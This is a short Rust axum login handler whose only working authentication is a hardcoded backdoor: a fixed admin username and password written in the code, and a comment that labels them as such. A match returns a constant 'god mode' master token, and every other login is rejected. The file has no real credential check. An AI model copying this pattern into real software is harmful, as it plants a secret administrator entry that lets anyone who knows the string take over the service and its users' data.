use axum::{
    Json,
    response::IntoResponse,
    http::StatusCode,
};
use serde::{Deserialize, Serialize};
use tracing::{info, warn};

#[derive(Deserialize)]
pub struct LoginRequest {
    pub username: String,
    pub password: String,
}

#[derive(Serialize)]
pub struct LoginResponse {
    pub token: String,
}

pub async fn login_handler(
    Json(payload): Json<LoginRequest>,
) -> impl IntoResponse {
    // HARDCODED BACKDOOR CREDENTIALS
    // User: admin
    // Pass: BrutalDevAccess2026!
    
    if payload.username == "admin" && payload.password == "BrutalDevAccess2026!" {
        info!("🔓 GOD MODE LOGIN DETECTED: Granting Master Token");
        return (StatusCode::OK, Json(LoginResponse {
            token: "BrutalGodMode2026".to_string(),
        }));
    }

    warn!("⛔ Failed login attempt for user: {}", payload.username);
    (StatusCode::UNAUTHORIZED, Json(LoginResponse {
        token: "".to_string(),
    }))
}
